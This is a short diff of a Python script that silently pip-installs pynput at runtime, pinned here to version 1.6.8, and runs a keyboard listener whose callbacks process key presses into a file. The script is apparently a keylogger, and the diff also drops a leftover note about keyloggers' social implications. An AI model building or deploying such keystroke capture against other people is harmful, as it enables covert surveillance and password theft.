@@ -10,7 +10,7 @@ from pynput.keyboard import Key, Listener
 
 # script to install pynput (implement pip as a subprocess):
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
-'pynput'])
+'pynput==1.6.8'])
 
 print("""
 
@@ -75,6 +75,4 @@ def process_input(keys, file): #processing the pynput module
 #runs program
 with Listener (on_press=keyboard_click, on_release=exit) as listener:
     listener.join()
-
-"social implications //hardware keyloggers"
 
